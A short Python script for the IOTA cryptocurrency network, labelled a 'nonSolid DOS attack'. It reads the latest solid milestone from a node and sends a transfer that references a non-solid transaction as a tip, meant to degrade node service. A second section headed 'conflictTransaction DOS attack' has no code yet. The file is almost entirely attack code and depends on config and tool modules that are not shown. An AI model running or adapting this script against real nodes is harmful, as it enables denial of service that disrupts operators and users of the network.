from config import *
from tool import *

api = Iota(node[0], seed=SEED)


# nonSolid DOS attack

if attackType == "nonSolid":
    nodeInfo = api.get_node_info()

    cMilestone = nodeInfo['latestSolidSubtangleMilestone']

    rTips = {'trunkTransaction':cMilestone,'branchTransaction':nonSolidTransaction} 

    send_transfer(startMessage,"",ADDRESS,0,rTips,0)

    print("milestone:"+ str(cMilestone))
    print("startMessage:"+ str(startMessage))
    

# conflictTransaction DOS attack 
